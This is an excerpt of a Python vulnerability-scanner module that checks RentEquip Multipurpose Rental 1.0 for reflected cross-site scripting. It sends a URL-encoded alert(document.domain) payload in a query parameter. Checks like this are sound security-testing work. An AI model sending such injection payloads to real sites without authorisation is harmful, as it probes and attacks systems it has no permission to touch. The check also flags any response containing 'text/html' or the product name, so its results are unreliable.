...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'RentEquip Multipurpose Rental 1.0 - Cross Site Scripting Detection',
        ...
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'xss', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/shop/products?category=cordless-tools&min=1026553%3balert(document.domain)%2f%2f772', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('rentequip', '1026553;alert(document.domain)//772', 'text/html',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="RentEquip Multipurpose Rental 1.0 - Cross Site Scripting detected",
